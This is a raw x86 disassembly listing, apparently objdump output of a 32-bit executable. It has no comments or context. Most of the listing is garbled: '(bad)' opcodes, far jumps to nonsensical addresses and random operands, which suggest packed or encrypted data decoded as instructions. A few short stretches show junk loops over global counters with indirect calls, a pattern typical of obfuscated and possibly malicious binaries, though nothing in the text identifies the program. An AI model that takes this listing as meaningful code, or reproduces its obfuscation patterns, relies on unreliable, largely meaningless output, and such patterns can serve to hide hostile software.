  41963e:	dec    esp
  41963f:	aam    0x17
  419641:	xor    cl,al
  419643:	inc    eax
  419644:	xchg   edi,eax
  419645:	mov    ecx,0xecf4bd1c
  41964a:	sbb    eax,0xd0978019
  41964f:	xlat   BYTE PTR ds:[ebx]
  419650:	fs pusha 
  419652:	mov    ah,0x85
  419654:	xchg   ebp,eax
  419655:	sbb    DWORD PTR [edi],ebx
  419657:	xor    dh,bl
  419659:	in     al,0x4f
  41965b:	ror    BYTE PTR [edi],1
  41965d:	cmp    eax,0x9376abcf
  419662:	retf   
  419663:	mov    ds:0x33e778e1,eax
  419668:	sub    bl,BYTE PTR [esi]
  41966a:	xchg   ebx,eax
  41966b:	sahf   
  41966c:	and    ch,BYTE PTR [esi]
  41966e:	aam    0xf9
  419670:	les    ebp,FWORD PTR [edx+0xb]
  419673:	xchg   ecx,eax
  419674:	pushf  
  419675:	inc    edi
  419676:	and    ecx,eax
  419678:	fdivr  DWORD PTR [ebx]
  41967a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41967b:	mov    dl,0x84
  41967d:	mov    eax,0x56f8aa10
  419682:	adc    DWORD PTR ds:0x6a112c75,esi
  419688:	adc    DWORD PTR [edx+0x6c],edx
  41968b:	das    
  41968c:	ror    WORD PTR [esi+0x5dc736b6],1
  419693:	pop    esp
  419694:	(bad)  
  419695:	aam    0x64
  419697:	ins    BYTE PTR es:[edi],dx
  419698:	imul   ebx,DWORD PTR ds:0x68230772,0x101ba006
  4196a2:	inc    ebp
  4196a3:	clc    
  4196a4:	lahf   
  4196a5:	fidiv  DWORD PTR [ebx]
  4196a7:	outs   dx,BYTE PTR ds:[esi]
  4196a8:	inc    esp
  4196a9:	adc    cl,0x21
  4196ac:	cmp    dh,BYTE PTR [eax-0x79]
  4196af:	mov    WORD PTR [eax-0x9],ds
  4196b2:	rcl    ah,0x13
  4196b5:	(bad)  
  4196b6:	mov    al,ds:0xac1880ae
  4196bb:	out    0x47,eax
  4196bd:	outs   dx,BYTE PTR ds:[esi]
  4196be:	dec    ebx
  4196bf:	fnsave [edi-0x52]
  4196c2:	fwait
  4196c3:	push   esi
  4196c4:	or     DWORD PTR [edx-0x1e403bcb],0x42
  4196cb:	stos   BYTE PTR es:[edi],al
  4196cc:	aas    
  4196cd:	pop    edx
  4196ce:	in     al,dx
  4196cf:	dec    edi
  4196d0:	cmc    
  4196d1:	ins    DWORD PTR es:[edi],dx
  4196d2:	lds    ebp,FWORD PTR [ecx+0x3b59f2ec]
  4196d8:	test   eax,0xc63e519e
  4196dd:	arpl   WORD PTR [ecx-0x527b7613],dx
  4196e3:	add    DWORD PTR [eax+0x44],ebp
  4196e6:	push   esi
  4196e7:	repz aas 
  4196e9:	adc    al,0xeb
  4196eb:	push   ecx
  4196ec:	sub    al,dh
  4196ee:	ror    esi,1
  4196f0:	imul   ebp,eax,0x83663642
  4196f6:	ds jmp 0x419679
  4196f9:	jmp    0x4196ad
  4196fb:	add    al,BYTE PTR [edi]
  4196fd:	mov    bl,0x4c
  4196ff:	sub    BYTE PTR [edx-0x34],cl
  419702:	mov    ds:0xa72bab6a,al
  419707:	sub    esi,DWORD PTR [ebp-0x8a4a6f9]
  41970d:	adc    ebx,ecx
  41970f:	cmp    DWORD PTR [eax+0x57],edi
  419712:	cmp    al,0x22
  419715:	fmul   st(6),st
  419717:	adc    al,0xa5
  419719:	xor    al,0x9b
  41971b:	dec    ecx
  41971c:	mov    edx,DWORD PTR [esi+eax*4-0x56]
  419720:	or     DWORD PTR [ecx+eax*4],0x5b94c35b
  419727:	xor    BYTE PTR [edi-0x71],0x73
  41972b:	shl    DWORD PTR [edi],1
  41972d:	lods   eax,DWORD PTR ds:[esi]
  41972e:	and    al,0x64
  419730:	out    0xd0,al
  419732:	push   0xffffffc9
  419734:	cmp    DWORD PTR [eax],ecx
  419736:	aaa    
  419737:	pop    edx
  419738:	pop    edx
  419739:	mov    dh,0xb5
  41973b:	xchg   ecx,eax
  41973c:	add    eax,0xf3993d19
  419741:	push   0xffffffb0
  419743:	inc    esp
  419744:	and    cl,dh
  419746:	loopne 0x4197a1
  419748:	paddsw mm7,mm5
  41974b:	jno    0x4197ca
  41974d:	push   ss
  41974e:	mov    ecx,DWORD PTR [ebp+0x14]
  419751:	add    esi,esi
  419753:	mov    ecx,DWORD PTR [ecx]
  419755:	mov    DWORD PTR [ebp-0x1c],ecx
  419758:	imul   edx,eax
  41975b:	xor    edi,DWORD PTR ds:0x42a801
  419761:	mov    ecx,0x4573
  419766:	add    edx,ecx
  419768:	sub    DWORD PTR ds:0x42a87d,ecx
  41976e:	mov    esi,0x7879
  419773:	mov    edi,0x1556
  419778:	not    DWORD PTR ds:0x42a845
  41977e:	xchg   esi,ecx
  419780:	add    DWORD PTR ds:0x42a7b5,0x585c
  41978a:	jmp    0x4199bf
  41978f:	iret   
  419790:	iret   
  419791:	(bad)  
  419792:	xlat   BYTE PTR ds:[ebx]
  419793:	(bad)  
  419794:	xlat   BYTE PTR ds:[ebx]
  419795:	iret   
  419796:	xlat   BYTE PTR ds:[ebx]
  419797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419798:	call   0x7365ddeb
  41979d:	jbe    0x419802
  41979f:	cmp    cl,cl
  4197a1:	jg     0x41981b
  4197a3:	adc    BYTE PTR [esi+0x78],bh
  4197a6:	js     0x41977f
  4197a8:	scas   eax,DWORD PTR es:[edi]
  4197a9:	test   eax,esp
  4197ab:	ins    DWORD PTR es:[edi],dx
  4197ac:	mov    dh,0x84
  4197ae:	fs push ebx
  4197b0:	push   ss
  4197b1:	int    0xab
  4197b3:	mov    dh,0x96
  4197b5:	pop    esi
  4197b6:	jb     0x4197ef
  4197b8:	out    0xe2,eax
  4197ba:	mov    esp,ebp
  4197bc:	retf   0x1146
  4197bf:	psadbw mm3,QWORD PTR [edi-0x4d]
  4197c3:	sahf   
  4197c4:	(bad)  
  4197c5:	adc    edi,DWORD PTR [edi]
  4197c7:	xor    al,0x49
  4197c9:	sbb    bh,dh
  4197cb:	imul   eax,DWORD PTR [edi],0x6f4a2238
  4197d1:	retf   0x5ab3
  4197d4:	jmp    0x9735:0x2f5c9459
  4197db:	ror    edx,0xaa
  4197de:	hlt    
  4197df:	adc    DWORD PTR [ecx],eax
  4197e1:	sti    
  4197e2:	jns    0x4197ce
  4197e4:	mov    eax,ds:0xd8e48bc9
  4197e9:	hlt    
  4197ea:	stos   BYTE PTR es:[edi],al
  4197eb:	std    
  4197ec:	sub    al,0x36
  4197ee:	mov    esi,0x126c9f65
  4197f3:	xor    BYTE PTR [ebx+0x24910914],bl
  4197f9:	or     ebx,DWORD PTR [eax]
  4197fb:	lods   eax,DWORD PTR ds:[esi]
  4197fc:	mov    WORD PTR [eax],gs
  4197fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197ff:	xchg   esi,edx
  419801:	pop    ecx
  419802:	inc    ebp
  419803:	push   esp
  419804:	scas   al,BYTE PTR es:[edi]
  419805:	dec    ecx
  419806:	test   BYTE PTR [ecx-0x5be81c65],al
  41980c:	es push 0x48
  41980f:	mov    esi,0x6d054ab1
  419814:	dec    ebp
  419815:	sbb    eax,0x6d492bc0
  41981a:	icebp  
  41981b:	and    ebp,DWORD PTR [ebx-0x581f173d]
  419821:	sub    BYTE PTR [eax],al
  419823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419824:	mov    WORD PTR [esi+0x74],?
  419827:	and    al,0x89
  419829:	pop    esp
  41982a:	xchg   ebp,eax
  41982b:	xor    al,0x3d
  41982d:	loopne 0x419887
  41982f:	nop
  419830:	scas   al,BYTE PTR es:[edi]
  419831:	add    esi,eax
  419833:	fyl2x  
  419835:	adc    esi,DWORD PTR [ebp-0x42]
  419838:	push   0x8ef38e75
  41983d:	mov    ecx,edx
  41983f:	jns    0x419865
  419841:	mov    ebx,esp
  419843:	mov    BYTE PTR [ebx],0x53
  419846:	add    eax,0xee3e32e2
  41984b:	aaa    
  41984c:	fwait
  41984d:	int    0xa4
  41984f:	pop    esp
  419850:	aam    0xb0
  419852:	(bad)  
  419853:	cmp    ch,BYTE PTR [ebx-0x51]
  419856:	mov    BYTE PTR [edi-0x25],bh
  419859:	inc    esp
  41985a:	fidiv  DWORD PTR [eax+edi*8]
  41985d:	iret   
  41985e:	xor    esp,DWORD PTR ds:0x71447310
  419864:	clc    
  419865:	push   ebp
  419866:	pop    ecx
  419867:	ins    DWORD PTR es:[edi],dx
  419868:	mov    BYTE PTR [esi+0x4136b815],ah
  41986e:	cmc    
  41986f:	nop
  419870:	add    edx,ebx
  419872:	mov    dl,0xc3
  419874:	mov    bh,0x95
  419876:	pop    eax
  419877:	leave  
  419878:	mov    ebp,0xb2cdc51a
  41987d:	cmc    
  41987e:	push   ebp
  41987f:	pop    ecx
  419880:	pop    ebx
  419881:	lahf   
  419882:	add    ebp,ebp
  419884:	sbb    eax,0xd44b45d6
  419889:	pop    esp
  41988a:	in     eax,0xe5
  41988c:	mov    bl,0x24
  41988e:	and    dl,0x68
  419891:	lahf   
  419892:	lods   eax,DWORD PTR ds:[esi]
  419893:	shl    eax,1
  419895:	(bad)  
  419897:	xchg   ebp,eax
  419898:	inc    dx
  41989a:	sub    eax,0x6c228252
  41989f:	mov    ds:0xf486ede1,al
  4198a4:	adc    DWORD PTR [esp+eax*4],esp
  4198a7:	xor    eax,DWORD PTR [ecx-0x4544354f]
  4198ad:	mov    WORD PTR [edx+edi*2-0x53a9eaac],?
  4198b4:	rol    BYTE PTR [esp+ebx*8-0x6419bdfb],1
  4198bb:	xchg   DWORD PTR [edx+0x3b323e37],edx
  4198c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198c2:	iret   
  4198c3:	mov    ecx,edi
  4198c5:	xor    eax,0x3a74a22d
  4198ca:	push   edi
  4198cb:	out    0x6c,al
  4198cd:	mov    cl,0x1f
  4198cf:	push   ebx
  4198d0:	or     edi,ebx
  4198d2:	fs popf 
  4198d4:	pop    edi
  4198d5:	push   esp
  4198d6:	sbb    BYTE PTR [edx-0x75ef9c89],0xec
  4198dd:	into   
  4198de:	inc    edi
  4198e0:	jl     0x419873
  4198e2:	or     eax,0xd0ca333c
  4198e7:	imul   DWORD PTR [ecx+0x16]
  4198ea:	mov    dl,0x14
  4198ec:	add    al,0x95
  4198ee:	dec    edi
  4198ef:	push   ebp
  4198f0:	inc    edi
  4198f1:	mov    al,ds:0x29b8a04d
  4198f6:	mov    ebx,DWORD PTR [ebp+0x5d249e53]
  4198fc:	loope  0x4198ce
  4198fe:	xlat   BYTE PTR ds:[ebx]
  4198ff:	pop    ecx
  419900:	out    dx,eax
  419901:	addr16 arpl bx,si
  419904:	push   eax
  419905:	shl    DWORD PTR [esi],1
  419907:	mov    dl,0x5f
  419909:	mov    BYTE PTR [ebx+0x639b59b1],0x6c
  419910:	js     0x41998c
  419912:	sub    DWORD PTR [ecx],esp
  419914:	push   ss
  419915:	loop   0x4198e3
  419917:	adc    eax,eax
  419919:	jmp    0x419919
  41991b:	test   DWORD PTR [edx-0xa44ed6c],edx
  419921:	mov    dh,0x94
  419923:	retf   
  419924:	push   0xffffff83
  419926:	shl    esi,cl
  419928:	repnz add DWORD PTR [ebx+0x48],edi
  41992c:	sub    DWORD PTR [eax+0x1e68925e],0x6129b579
  419936:	push   edi
  419937:	mov    cl,0x6d
  419939:	push   ebx
  41993a:	in     al,0x50
  41993c:	retf   
  41993d:	sub    dh,BYTE PTR [edi+esi*2+0x58cafba5]
  419944:	ins    DWORD PTR es:[edi],dx
  419945:	fistp  DWORD PTR [edi]
  419947:	rep ins DWORD PTR es:[edi],dx
  419949:	xor    DWORD PTR [edx],edx
  41994b:	lods   eax,DWORD PTR ds:[esi]
  41994c:	push   0x21
  41994e:	mov    edi,0x7d305401
  419953:	les    esi,FWORD PTR [esi]
  419955:	enter  0x39ef,0x7f
  419959:	jge    0x4199c2
  41995b:	aas    
  41995c:	mov    ds:0x135d3c4d,eax
  419961:	jmp    0x41995c
  419963:	outs   dx,BYTE PTR ds:[esi]
  419964:	push   cs
  419965:	inc    DWORD PTR [esi+0x79b3d7a8]
  41996b:	dec    ecx
  41996c:	mov    ebx,0x454a64ac
  419971:	push   esi
  419972:	arpl   ax,bx
  419974:	xchg   bx,ax
  419976:	test   DWORD PTR [ebx-0x1b],0x37735427
  41997d:	ret    0x3488
  419980:	pop    eax
  419981:	mov    ah,0xad
  419983:	(bad)  
  419985:	loopne 0x419970
  419987:	stc    
  419988:	out    0xe4,al
  41998a:	xchg   esi,eax
  41998b:	cdq    
  41998c:	fwait
  41998d:	pop    ecx
  41998e:	xchg   DWORD PTR [edx-0x7208a729],ecx
  419994:	fcmovu st,st(7)
  419996:	jno    0x419991
  419998:	mov    bl,ah
  41999a:	or     cl,bl
  41999c:	fimul  DWORD PTR [esi-0x61]
  41999f:	mov    al,BYTE PTR [edx+0x7a51f8ca]
  4199a5:	loope  0x41998d
  4199a7:	sahf   
  4199a8:	sub    bh,cl
  4199aa:	repnz mov al,0x2b
  4199ad:	repz xor BYTE PTR [esi],0x14
  4199b1:	std    
  4199b2:	add    al,0xc1
  4199b4:	xchg   esi,eax
  4199b5:	and    DWORD PTR [edi-0x277277a5],eax
  4199bb:	xchg   edx,eax
  4199bc:	jnp    0x4199c1
  4199be:	shr    BYTE PTR [ebx],1
  4199c0:	xlat   BYTE PTR ds:[ebx]
  4199c1:	adc    ecx,0x1fe4
  4199c7:	xor    esi,esi
  4199c9:	xor    DWORD PTR ds:0x42a80d,0x2675
  4199d3:	mov    DWORD PTR [ebp-0x28],esi
  4199d6:	mov    DWORD PTR ds:0x42a881,0x12
  4199e0:	cmp    DWORD PTR ds:0x42a881,0x0
  4199e7:	je     0x419a88
  4199ed:	cmp    DWORD PTR ds:0x42a881,0x16
  4199f4:	jne    0x419a15
  4199fa:	push   0x8ec2
  4199ff:	push   DWORD PTR [ebp-0x24]
  419a02:	push   0x4fb2
  419a07:	push   0x17f0
  419a0c:	push   DWORD PTR [ebp-0x20]
  419a0f:	call   DWORD PTR ds:0x41d11c
  419a15:	mov    ecx,DWORD PTR ds:0x42a881
  419a1b:	dec    ecx
  419a1c:	mov    DWORD PTR ds:0x42a881,ecx
  419a22:	jmp    0x4199e0
  419a27:	mov    DWORD PTR ds:0x42a765,0x1b
  419a31:	cmp    DWORD PTR ds:0x42a765,0x0
  419a38:	je     0x419a88
  419a3e:	cmp    DWORD PTR ds:0x42a765,0x5
  419a45:	jne    0x419a54
  419a4b:	push   DWORD PTR [ebp-0x14]
  419a4e:	call   DWORD PTR ds:0x41d1fc
  419a54:	cmp    DWORD PTR ds:0x42a765,0x6
  419a5b:	jne    0x419a6e
  419a61:	mov    ecx,DWORD PTR ds:0x42a765
  419a67:	dec    ecx
  419a68:	mov    DWORD PTR ds:0x42a765,ecx
  419a6e:	xor    ecx,ecx
  419a70:	or     ecx,DWORD PTR ds:0x42a765
  419a76:	dec    ecx
  419a77:	mov    DWORD PTR ds:0x42a765,ecx
  419a7d:	jmp    0x419a31
  419a82:	adc    DWORD PTR ds:0x42a805,ebx
  419a88:	mov    DWORD PTR [ebp-0x2c],esi
  419a8b:	and    DWORD PTR ds:0x42a849,ecx
  419a91:	mov    DWORD PTR [ebp-0x14],esi
  419a94:	add    ecx,DWORD PTR ds:0x42a7b5
  419a9a:	mov    DWORD PTR [ebp-0x8],esi
  419a9d:	mov    ecx,DWORD PTR [ebp-0x18]
  419aa0:	adc    DWORD PTR ds:0x42a83d,0x42a7b1
  419aaa:	xor    ecx,eax
  419aac:	xor    edi,edi
  419aae:	and    DWORD PTR ds:0x42a881,0x0
  419ab8:	jmp    0x419ac8
  419abd:	mov    eax,ds:0x42a881
  419ac2:	inc    eax
  419ac3:	mov    ds:0x42a881,eax
  419ac8:	cmp    DWORD PTR ds:0x42a881,0x1c
  419acf:	jae    0x419af8
  419ad5:	cmp    DWORD PTR ds:0x42a881,0x1e
  419adc:	jne    0x419aed
  419ae2:	push   0x42a805
  419ae7:	call   DWORD PTR ds:0x41d120
  419aed:	jmp    0x419abd
  419af2:	adc    eax,DWORD PTR ds:0x42a7cd
  419af8:	add    ecx,ebx
  419afa:	mov    DWORD PTR [ebp-0x20],ecx
  419afd:	mov    eax,ds:0x42a845
  419b02:	jmp    0x419d37
  419b07:	cmp    eax,0xcbcec3c5
  419b0c:	fcmovbe st,st(1)
  419b0e:	aad    0x68
  419b10:	xor    DWORD PTR [ecx+0xd],0x18
  419b14:	repz xor al,0xb0
  419b17:	ror    bh,1
  419b19:	jg     0x419b93
  419b1b:	adc    BYTE PTR [esi+0x78],bh
  419b1e:	js     0x419aec
  419b20:	push   0xffffffd7
  419b22:	int3   
  419b23:	mov    edx,0x655e2a83
  419b28:	push   0x18
  419b2a:	xor    esi,esp
  419b2c:	pop    ebp
  419b2d:	rcl    BYTE PTR [ebp+0x5cb324c4],1
  419b33:	leave  
  419b34:	push   ds
  419b35:	sbb    esp,DWORD PTR [ecx+0x7a]
  419b38:	pop    ds
  419b39:	pop    edx
  419b3a:	xor    BYTE PTR [edx-0x19327c17],dl
  419b40:	adc    cl,BYTE PTR [ebx+ecx*4]
  419b43:	aas    
  419b44:	dec    ecx
  419b45:	pop    edx
  419b46:	mov    ?,ebp
  419b48:	das    
  419b49:	icebp  
  419b4a:	xor    ebp,ebp
  419b4c:	sbb    esp,ecx
  419b4e:	lock pop ss
  419b50:	adc    eax,0x5520a0c5
  419b55:	and    BYTE PTR [ebp-0x7d],bl
  419b58:	inc    ebx
  419b59:	push   edi
  419b5a:	xchg   ecx,eax
  419b5b:	add    eax,0x8dffdf08
  419b60:	or     bh,BYTE PTR [eax+0x258721fd]
  419b66:	ins    BYTE PTR es:[edi],dx
  419b67:	add    DWORD PTR [edi-0x73],eax
  419b6a:	fistp  QWORD PTR [eax+edi*2+0x47a5fe8b]
  419b71:	xor    BYTE PTR [esi-0x6],0x41
  419b75:	sub    DWORD PTR [esp+edx*1],esp
  419b78:	sbb    eax,0x794747d9
  419b7d:	mov    esp,0x4b92bab8
  419b82:	mov    ds:0x65ec97d7,al
  419b87:	add    esi,DWORD PTR [esi-0x12645945]
  419b8d:	call   0x9671d2a
  419b92:	sub    DWORD PTR [ebx+0x3f],edi
  419b95:	inc    ecx
  419b96:	pop    ss
  419b97:	and    ch,BYTE PTR [edx-0x74cf2305]
  419b9d:	mov    esi,DWORD PTR [edx+0x44]
  419ba0:	dec    esp
  419ba1:	jge    0x419bde
  419ba3:	ret    
  419ba4:	retf   0x567e
  419ba7:	inc    ebx
  419ba8:	sub    al,0x87
  419baa:	push   ds
  419bab:	adc    dh,ch
  419bad:	mov    ds:0x9812d952,eax
  419bb2:	add    DWORD PTR [ecx+ebx*1-0xbd6931],esi
  419bb9:	pop    eax
  419bba:	mov    cl,0xbd
  419bbc:	xor    esp,DWORD PTR [edi-0x5510ee22]
  419bc2:	and    BYTE PTR fs:[edi-0x594feaa],bl
  419bc9:	pushf  
  419bca:	pop    ecx
  419bcb:	inc    esp
  419bcc:	test   eax,0xb82abbae
  419bd1:	in     al,0x87
  419bd3:	push   0xe449d53
  419bd8:	into   
  419bd9:	arpl   WORD PTR [ebp+0x630068c4],si
  419bdf:	and    eax,0xdf3fb90
  419be4:	enter  0x9dbd,0x69
  419be8:	mov    cl,0xcf
  419bea:	dec    ecx
  419beb:	das    
  419bec:	inc    eax
  419bed:	popf   
  419bee:	pop    eax
  419bef:	test   DWORD PTR [ecx+esi*8+0x22337bc8],ecx
  419bf6:	cs loopne 0x419be7
  419bf9:	xchg   ebp,eax
  419bfa:	push   esp
  419bfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bfc:	or     ah,cl
  419bfe:	test   BYTE PTR [edi+0x2e],al
  419c01:	fstp   st(3)
  419c03:	xchg   edx,eax
  419c04:	xlat   BYTE PTR ds:[ebx]
  419c05:	popa   
  419c06:	int3   
  419c07:	or     ebx,DWORD PTR [ebx+0x56]
  419c0a:	sbb    ah,BYTE PTR [edi]
  419c0c:	xchg   edx,eax
  419c0d:	mov    es,WORD PTR [ebp-0x17]
  419c10:	test   al,0x5e
  419c12:	hlt    
  419c13:	scas   al,BYTE PTR es:[edi]
  419c14:	repz js 0x419c44
  419c17:	pop    ds
  419c18:	mov    ?,WORD PTR [ebp+0x35443b68]
  419c1e:	xchg   DWORD PTR [ecx],ecx
  419c20:	and    edx,ecx
  419c22:	mov    eax,0x891a4af9
  419c27:	and    al,0xb
  419c29:	test   DWORD PTR [ecx],esp
  419c2b:	inc    esi
  419c2c:	dec    ebp
  419c2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c2e:	shl    cl,cl
  419c30:	ja     0x419c8c
  419c32:	call   0xa16a:0xcc778195
  419c39:	loopne 0x419c83
  419c3b:	(bad)  [eax]
  419c3d:	xlat   BYTE PTR ds:[ebx]
  419c3e:	adc    dh,bl
  419c40:	and    al,0x41
  419c42:	cwde   
  419c43:	cwde   
  419c44:	cwde   
  419c45:	jnp    0x419c9e
  419c47:	outs   dx,BYTE PTR ds:[esi]
  419c48:	dec    edi
  419c49:	cli    
  419c4a:	sbb    BYTE PTR [ebp+0x1],al
  419c4d:	pop    eax
  419c4e:	and    dl,BYTE PTR [edx]
  419c50:	data16 mov WORD PTR [edi+0x70],fs
  419c54:	sbb    eax,edi
  419c56:	scas   eax,DWORD PTR es:[edi]
  419c57:	repz sahf 
  419c59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c5a:	jp     0x419c5f
  419c5c:	add    BYTE PTR [edi+0x3e746463],0x94
  419c63:	mov    ebp,0x83bbc3b5
  419c68:	daa    
  419c69:	nop
  419c6a:	fcomp  DWORD PTR [eax-0x42f309d6]
  419c70:	gs inc ecx
  419c72:	fdiv   DWORD PTR [esi]
  419c74:	ret    
  419c75:	push   eax
  419c76:	mov    cl,0xfc
  419c78:	cs xor al,0x9
  419c7b:	add    dl,dl
  419c7d:	xchg   esp,eax
  419c7e:	adc    al,0xa
  419c80:	ds xchg esi,eax
  419c82:	xor    dh,BYTE PTR [edx+0x313db732]
  419c88:	imul   edx,DWORD PTR [edx-0x779e6ca],0x5d
  419c8f:	rol    DWORD PTR [eax-0x2b65a1ec],0xa6
  419c96:	mov    ds:0x11dd71b1,al
  419c9b:	push   ebx
  419c9c:	inc    eax
  419c9d:	fisttp WORD PTR [edx]
  419c9f:	loop   0x419c71
  419ca1:	shl    BYTE PTR [ebx-0x36],0x59
  419ca5:	cli    
  419ca6:	(bad)  
  419ca7:	(bad)  
  419ca8:	(bad)  
  419ca9:	mov    eax,ds:0x3a8ce727
  419cae:	sbb    ebp,DWORD PTR [esi+0x61c3542]
  419cb4:	sub    BYTE PTR cs:[ebx+0x34],dl
  419cb8:	sbb    ah,ah
  419cba:	outs   dx,BYTE PTR ds:[esi]
  419cbb:	jl     0x419d2c
  419cbd:	ss cli 
  419cbf:	das    
  419cc0:	pop    edx
  419cc1:	xchg   esi,eax
  419cc2:	adc    ah,BYTE PTR [edx+0x1c7092c5]
  419cc8:	add    bl,ch
  419cca:	xor    eax,0x9837fa7e
  419ccf:	xlat   BYTE PTR ds:[ebx]
  419cd0:	jg     0x419c73
  419cd2:	pop    edi
  419cd3:	mov    al,0x79
  419cd5:	retf   0xb45c
  419cd8:	scas   al,BYTE PTR es:[edi]
  419cd9:	outs   dx,DWORD PTR ds:[esi]
  419cda:	and    eax,0x5205804f
  419cdf:	mov    al,ds:0x7bc4086
  419ce4:	push   eax
  419ce5:	(bad)  
  419ce6:	hlt    
  419ce7:	or     DWORD PTR [eax+0x2],ebp
  419cea:	aad    0x81
  419cec:	ds test dl,dh
  419cef:	je     0x419d32
  419cf1:	push   esi
  419cf2:	add    eax,0xbef2b2ec
  419cf7:	adc    ah,BYTE PTR [ebp-0x65276f28]
  419cfd:	adc    al,0xc3
  419cff:	call   0xb55114fb
  419d04:	xchg   ebx,eax
  419d05:	pushf  
  419d06:	fstp   DWORD PTR [esi-0xc]
  419d09:	adc    al,0x4d
  419d0b:	xchg   ebp,eax
  419d0c:	mov    dl,0x8e
  419d0e:	stos   DWORD PTR es:[edi],eax
  419d0f:	out    0x34,eax
  419d11:	fiadd  DWORD PTR [eax-0x13217efc]
  419d17:	jne    0x419d58
  419d19:	cmp    al,0x5e
  419d1b:	loopne 0x419cb0
  419d1d:	(bad)  
  419d1e:	ror    DWORD PTR [eax+ecx*1],1
  419d21:	mov    ecx,0x96dcbf95
  419d26:	add    DWORD PTR [edx],esp
  419d28:	repz pop esp
  419d2a:	push   eax
  419d2b:	ins    DWORD PTR es:[edi],dx
  419d2c:	jne    0x419d7a
  419d2e:	iret   
  419d2f:	pop    ebx
  419d30:	pop    ebp
  419d31:	fbstp  TBYTE PTR [ebx]
  419d33:	mov    dh,0x92
  419d35:	repz daa 
  419d37:	mov    eax,DWORD PTR [ebp-0x20]
  419d3a:	je     0x41a8c9
  419d40:	inc    eax
  419d41:	mov    eax,DWORD PTR [ebp-0x4]
  419d44:	xor    eax,0x7510850
  419d49:	sbb    DWORD PTR ds:0x42a839,0x42a76d
  419d53:	add    eax,ebx
  419d55:	mov    DWORD PTR ds:0x42a889,0x7077
  419d5f:	cmp    edi,eax
  419d61:	mov    DWORD PTR ds:0x42a83d,0xab2
  419d6b:	jmp    0x419fa0
  419d70:	(bad)  
  419d71:	into   
  419d72:	ror    bh,cl
  419d74:	(bad)  
  419d76:	leave  
  419d77:	(bad)  
  419d78:	push   0xffffffe9
  419d7a:	or     esi,esi
  419d7c:	add    eax,0xe899cd25
  419d81:	int    0x7f
  419d83:	js     0x419d95
  419d85:	jle    0x419dff
  419d87:	js     0x419d4e
  419d89:	sub    DWORD PTR [ecx-0x6f734cb],eax
  419d8f:	stc    
  419d90:	lea    esi,[ebp-0x53]
  419d93:	jbe    0x419db6
  419d95:	aas    
  419d96:	inc    esi
  419d97:	sti    
  419d98:	sub    eax,0xfdc5d61d
  419d9d:	mov    edi,ebx
  419d9f:	call   0xa012:0x6a277278
  419da6:	hlt    
  419da7:	imul   esp,DWORD PTR ds:[esp+ecx*8],0xffffffce
  419dac:	cmp    dh,ch
  419dae:	inc    ebx
  419daf:	push   esi
  419db0:	xor    al,0x7c
  419db2:	mov    eax,ds:0xa2e39bb6
  419db7:	jmp    0x19d22787
  419dbc:	leave  
  419dbd:	(bad)  
  419dbf:	mov    dl,0xde
  419dc1:	jmp    0x714e:0x4a363821
  419dc8:	add    BYTE PTR ds:0xd48d115e,0x1d
  419dcf:	ins    BYTE PTR es:[edi],dx
  419dd0:	popa   
  419dd1:	sahf   
  419dd2:	stc    
  419dd3:	enter  0x449,0xa4
  419dd7:	lods   eax,DWORD PTR ds:[esi]
  419dd8:	loopne 0x419e55
  419dda:	mov    al,ds:0x35905b57
  419ddf:	dec    ebp
  419de0:	mov    al,0xe3
  419de2:	add    BYTE PTR [edx+edx*1],ch
  419de5:	jecxz  0x419e19
  419de7:	mov    ecx,0xce480fed
  419dec:	sub    esp,DWORD PTR [ecx-0x46f0aedb]
  419df2:	mov    al,ds:0xcdd14ed
  419df7:	mov    esp,0xbf404fc0
  419dfc:	test   DWORD PTR [si],eax
  419dff:	xor    DWORD PTR [ebp+0x4b],edx
  419e02:	or     eax,ebp
  419e04:	and    BYTE PTR [eax-0x1b9ce767],0xab
  419e0b:	sub    eax,DWORD PTR [edx+ecx*8-0x2]
  419e0f:	inc    esi
  419e10:	sbb    cl,BYTE PTR [eax-0x2]
  419e13:	js     0x419dbe
  419e15:	mov    ecx,0xbbaf740f
  419e1a:	retf   0xdd28
  419e1d:	pop    ebx
  419e1e:	cwde   
  419e1f:	clc    
  419e20:	rcr    DWORD PTR [ecx],0xb9
  419e23:	in     al,0xcd
  419e25:	pusha  
  419e26:	pop    edi
  419e27:	sar    DWORD PTR [eax-0x38],1
  419e2a:	add    DWORD PTR [esi],esi
  419e2c:	sar    DWORD PTR [edi+0x72],0x18
  419e30:	(bad)  
  419e31:	mov    esp,0x4ed06608
  419e36:	cmp    bh,al
  419e38:	in     al,0x61
  419e3a:	dec    ebx
  419e3b:	out    dx,eax
  419e3c:	mov    ?,WORD PTR ss:[edi-0x38]
  419e40:	mov    ch,0x45
  419e42:	fimul  DWORD PTR [ebx+0x5773ea4a]
  419e48:	ins    BYTE PTR es:[edi],dx
  419e49:	sbb    DWORD PTR ds:[ebx],ebx
  419e4c:	mov    ch,0x15
  419e4e:	and    ch,bl
  419e50:	div    dh
  419e52:	push   ss
  419e53:	retf   0xc9f2
  419e56:	int    0x4f
  419e58:	jae    0x419ed8
  419e5a:	sub    ch,BYTE PTR [edx]
  419e5c:	(bad)  
  419e5d:	adc    al,0x68
  419e5f:	(bad)  
  419e60:	fistp  DWORD PTR [edx+ecx*2+0xcb68be2]
  419e67:	xor    DWORD PTR [edi],edi
  419e69:	sub    BYTE PTR [ecx-0x3793115f],dl
  419e6f:	loop   0x419e85
  419e71:	into   
  419e72:	in     eax,0xbe
  419e74:	pop    es
  419e75:	(bad)  
  419e76:	jbe    0x419e20
  419e78:	xchg   ebp,eax
  419e79:	ds lahf 
  419e7b:	sub    bh,bl
  419e7d:	cdq    
  419e7e:	xor    al,0xaa
  419e80:	cmp    ebx,ecx
  419e82:	(bad)  
  419e83:	sbb    bl,BYTE PTR [ebx+0x3]
  419e86:	sbb    edx,DWORD PTR [ebx]
  419e88:	(bad)  
  419e89:	mov    eax,0x925fec2f
  419e8e:	or     al,0xa8
  419e90:	adc    esi,DWORD PTR [edi]
  419e92:	stos   DWORD PTR es:[edi],eax
  419e93:	sub    DWORD PTR [ecx+edi*8+0x5f331d3b],edx
